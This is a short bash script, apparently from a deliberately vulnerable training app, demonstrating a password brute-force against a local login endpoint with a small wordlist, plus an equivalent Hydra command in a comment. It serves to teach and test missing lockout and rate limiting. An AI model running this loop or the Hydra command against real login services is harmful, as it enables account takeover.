#!/bin/bash
# VULN-02: Brute Force - vulnerable build has no attempt limit, no lockout.
# Run against the VULNERABLE build (port 5000) only. Targets your own local
# container. A short in-repo wordlist stands in for Hydra for portability;
# the same list driven through Hydra (hydra -l bob -P wordlist.txt
# 127.0.0.1 -s 5000 http-post-form "/login:username=^USER^&password=^PASS^:Invalid") succeeds identically.

TARGET="http://127.0.0.1:5000/login"
USERNAME="bob"
WORDLIST=("123456" "password" "bob1" "letmein" "bob123" "qwerty")

echo "Brute-forcing user '$USERNAME' against $TARGET"
for pass in "${WORDLIST[@]}"; do
  resp=$(curl -s -i -X POST "$TARGET" \
    --data-urlencode "username=$USERNAME" --data-urlencode "password=$pass")
  if echo "$resp" | grep -q "302 FOUND"; then
    echo "[+] SUCCESS: $USERNAME:$pass"
    exit 0
  else
    echo "[-] tried $pass -> failed (no lockout, no delay, no CAPTCHA)"
  fi
done
echo "Password not in list, but note: nothing in the app stopped this loop."
